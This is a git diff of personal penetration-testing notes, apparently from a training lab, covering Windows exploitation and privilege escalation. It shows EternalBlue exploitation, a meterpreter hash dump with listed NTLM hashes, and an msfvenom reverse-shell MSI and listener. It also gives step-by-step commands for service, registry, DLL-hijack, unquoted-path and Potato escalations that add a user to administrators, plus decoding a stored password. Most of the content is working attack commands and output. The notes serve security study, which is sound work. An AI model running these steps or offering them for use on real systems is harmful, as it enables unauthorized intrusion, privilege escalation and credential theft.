@@ -67,7 +67,7 @@
         rpcinfo -p 10.10.201.3
             10.10.201.3: RPC: Remote system error - Connection refused
 
-    Based on the Windows Version we will try Ethernal Blue:
+    Based on the Windows Version we will try Eternal Blue:
         Exploiting ms17–010 using Metasploit
             -https://medium.com/@rakshan793/blue-walkthrough-hack-the-box-7d5a87db5dbe
         
@@ -76,88 +76,282 @@
 
         It works we have a meterpreter shell
 
-    Harvest credentials meterpreter:
-    -https://www.coengoedegebure.com/hacking-windows-with-meterpreter/
+        Harvest credentials meterpreter:
+        -https://www.coengoedegebure.com/hacking-windows-with-meterpreter/
 
-        meterpreter > run post/windows/gather/hashdump
+            meterpreter > run post/windows/gather/hashdump
 
-        [*] Obtaining the boot key...
-        [*] Calculating the hboot key using SYSKEY f84cc9ef701ecf160296222e4d21286e...
-        [*] Obtaining the user list and keys...
-        [*] Decrypting user keys...
-        [*] Dumping password hints...
+            [*] Obtaining the boot key...
+            [*] Calculating the hboot key using SYSKEY f84cc9ef701ecf160296222e4d21286e...
+            [*] Obtaining the user list and keys...
+            [*] Decrypting user keys...
+            [*] Dumping password hints...
 
-        TCM:"Super secure password"
+            TCM:"Super secure password"
 
-        [*] Dumping password hashes...
+            [*] Dumping password hashes...
 
-        Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-        TCM:1001:aad3b435b51404eeaad3b435b51404ee:9075168608b7aba2428c8387bfeb9aee:::
-        HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:87d8f24dad52ed0401ec399facbca46c:::
-        user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
+            Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+            TCM:1001:aad3b435b51404eeaad3b435b51404ee:9075168608b7aba2428c8387bfeb9aee:::
+            HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:87d8f24dad52ed0401ec399facbca46c:::
+            user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
 
-        IF it was in AD Scenario we will use PTH Attack 
+            IF it was in AD Scenario we will use PTH Attack 
 
-        Else We can use hashcat 
-        
-    Screen Capture:
-        meterpreter > execute -f calc.exe
-        Process 3020 created.
-        meterpreter > screenshot
+            Else We can use hashcat 
+            
+        Screen Capture:
+            meterpreter > execute -f calc.exe
+            Process 3020 created.
+            meterpreter > screenshot
 
-    Scrape the system:
-        Scrape the system
+        Scrape the system:
+            Scrape the system
 
-            Running Command List ...
-                [*]     running command cmd.exe /c set
-                [*]     running command arp -a
-                [*]     running command ipconfig /all
-                [*]     running command ipconfig /displaydns
-                [*]     running command route print
-                [*]     running command net view
-                [*]     running command netstat -nao
-                [*]     running command netstat -vb
-                [*]     running command netstat -ns
-                [*]     running command net accounts
-                [*]     running command net session
-                [*]     running command net share
-                [*]     running command net localgroup administrators
-                [*]     running command net group
-                [*]     running command net user
-                [*]     running command netsh firewall show config
-                [*]     running command net group administrators
-                [*]     running command tasklist /svc
-                [*]     running command net view /domain
-                [*]     running command net localgroup
-                [*]     running command netsh wlan show profiles
-                [*]     running command gpresult /SCOPE USER /Z
-                [*]     running command gpresult /SCOPE COMPUTER /Z
-                [*]     running command netsh wlan show drivers
-                [*]     running command netsh wlan show interfaces
-                [*]     running command netsh wlan show networks mode=bssid
-                [*] Running WMIC Commands ....
-                [*]     running command wmic useraccount list
-                [*]     running command wmic service list brief
-                [*]     running command wmic group list
-                [*]     running command wmic volume list brief
-                [*]     running command wmic netlogin get name,lastlogon,badpasswordcount
-                [*]     running command wmic netuse get name,username,connectiontype,localname
-                [*]     running command wmic netclient list brief
-                [*]     running command wmic nteventlog get path,filename,writeable
-                [*]     running command wmic share get name,path
-                [*]     running command wmic logicaldisk get description,filesystem,name,size
-                [*]     running command wmic rdtoggle list
-                [*]     running command wmic qfe
-                [*]     running command wmic startup list full
-                [*]     running command wmic product get name,version
-                [*] Extracting software list from registry
-                [*] Dumping password hashes...
-                [*] Hashes Dumped
-                [*] Getting Tokens...
+                Running Command List ...
+                    [*]     running command cmd.exe /c set
+                    [*]     running command arp -a
+                    [*]     running command ipconfig /all
+                    [*]     running command ipconfig /displaydns
+                    [*]     running command route print
+                    [*]     running command net view
+                    [*]     running command netstat -nao
+                    [*]     running command netstat -vb
+                    [*]     running command netstat -ns
+                    [*]     running command net accounts
+                    [*]     running command net session
+                    [*]     running command net share
+                    [*]     running command net localgroup administrators
+                    [*]     running command net group
+                    [*]     running command net user
+                    [*]     running command netsh firewall show config
+                    [*]     running command net group administrators
+                    [*]     running command tasklist /svc
+                    [*]     running command net view /domain
+                    [*]     running command net localgroup
+                    [*]     running command netsh wlan show profiles
+                    [*]     running command gpresult /SCOPE USER /Z
+                    [*]     running command gpresult /SCOPE COMPUTER /Z
+                    [*]     running command netsh wlan show drivers
+                    [*]     running command netsh wlan show interfaces
+                    [*]     running command netsh wlan show networks mode=bssid
+                    [*] Running WMIC Commands ....
+                    [*]     running command wmic useraccount list
+                    [*]     running command wmic service list brief
+                    [*]     running command wmic group list
+                    [*]     running command wmic volume list brief
+                    [*]     running command wmic netlogin get name,lastlogon,badpasswordcount
+                    [*]     running command wmic netuse get name,username,connectiontype,localname
+                    [*]     running command wmic netclient list brief
+                    [*]     running command wmic nteventlog get path,filename,writeable
+                    [*]     running command wmic share get name,path
+                    [*]     running command wmic logicaldisk get description,filesystem,name,size
+                    [*]     running command wmic rdtoggle list
+                    [*]     running command wmic qfe
+                    [*]     running command wmic startup list full
+                    [*]     running command wmic product get name,version
+                    [*] Extracting software list from registry
+                    [*] Dumping password hashes...
+                    [*] Hashes Dumped
+                    [*] Getting Tokens...
 
 
 
-    key.txt:
-        KKQFK-89TGP-J4W4X-3XPCG-CQRYW
+        key.txt:
+            KKQFK-89TGP-J4W4X-3XPCG-CQRYW
                                                                             
+
+    Registry Escalation - AlwaysInstallElevated:
+        Windows VM
+
+            1.Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+            2.From the output, notice that “AlwaysInstallElevated” value is 1.
+            3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+            4.From the output, notice that “AlwaysInstallElevated” value is 1.
+
+        Exploitation
+
+        Kali VM
+
+            1. Open command prompt and type: msfconsole
+            2. In Metasploit (msf > prompt) type: use multi/handler
+            3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
+            4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
+            5. In Metasploit (msf > prompt) type: run
+            6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
+            7. Copy the generated file, setup.msi, to the Windows VM.
+
+        Windows VM
+
+            1.Place ‘setup.msi’ in ‘C:\Temp’.
+            2.Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi
+
+
+    Service Escalation - Registry:
+        Detection
+
+            Windows VM
+
+                1. Open powershell prompt and type: Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+                2. Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.
+
+            Exploitation
+
+                Windows VM
+
+                    1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.
+                        Admin cmdPrompt:
+                            copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ \\<KaliIP>\Path
+
+                        or use impacket + smbserver:
+                            https://www.linkedin.com/pulse/transfer-files-from-windows-kali-julio-sanchez/
+
+                            On Kali
+                            python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support myshare2 .
+
+                Kali VM
+
+                    1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
+                    2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
+                    3. Copy the generated file x.exe, to the Windows VM.
+
+                Windows VM
+
+                    1. Place x.exe in ‘C:\Temp’.
+                    2. Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+                    3. In the command prompt type: sc start regsvc
+                    4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+
+    Service Escalation - Executable Files:
+
+        Detection
+
+            Windows VM
+
+            1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+            2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.
+
+        Exploitation
+
+            Windows VM
+
+            1. Open command prompt and type: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+            2. In command prompt type: sc start filepermsvc
+            3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+
+    Service Escalation - DLL Hijacking:
+
+            Detection
+
+                Windows VM
+
+                    1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
+                    2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
+                    3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.
+                    4. In the input box on the same line type: dllhijackservice.exe
+                    5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
+                    6. Next, select from the left-most drop down menu ‘Result’.
+                    7. In the input box on the same line type: NAME NOT FOUND
+                    8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
+                    9. Open command prompt and type: sc start dllsvc
+                    10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.
+
+            Exploitation
+
+                Windows VM
+
+                    1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.
+                    OR Admin cmdPrompt:
+                                    copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ \\<KaliIP>\Path
+
+                                or use impacket + smbserver:
+                                    https://www.linkedin.com/pulse/transfer-files-from-windows-kali-julio-sanchez/
+
+                                    On Kali
+                                    python3 
+
+                Kali VM
+
+                    1. Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
+                    2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+                    3. Copy the generated file hijackme.dll, to the Windows VM.
+
+                Windows VM
+
+                    1. Place hijackme.dll in ‘C:\Temp’.
+                    2. Open command prompt and type: sc stop dllsvc & sc start dllsvc
+                    3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+
+    Service Escalation - binPath:
+
+        Detection
+
+            Windows VM
+
+                1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
+
+                2. Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.
+
+        Exploitation
+
+            Windows VM
+
+                1. In command prompt type: sc config daclsvc binpath= "net localgroup administrators user /add"
+                2. In command prompt type: sc start daclsvc
+                3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+
+    Service Escalation - Unquoted Service Paths:
+
+        Detection
+
+            Windows VM
+
+                1. Open command prompt and type: sc qc unquotedsvc
+                2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.
+
+        Exploitation
+
+            Kali VM
+
+                1. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+                2. Copy the generated file, common.exe, to the Windows VM.
+
+            Windows VM
+
+                1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
+                2. Open command prompt and type: sc start unquotedsvc
+                3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+        For additional practice, it is recommended to attempt the TryHackMe room Steel Mountain (https://tryhackme.com/room/steelmountain).
+
+
+    Potato Escalation - Hot Potato:
+
+        Exploitation
+
+            Windows VM
+
+                1. In command prompt type: powershell.exe -nop -ep bypass
+                2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
+                3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+                4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
+
+
+    Password Mining Escalation - Configuration Files - XML:
+
+        Exploitation
+
+            Windows VM
+
+                1. Open command prompt and type: notepad C:\Windows\Panther\Unattend.xml
+                2. Scroll down to the “<Password>” property and copy the base64 string that is confined between the “<Value>” tags underneath it.
+
+            Kali VM
+
+                1. In a terminal, type: echo [copied base64] | base64 -d
+                2. Notice the cleartext password
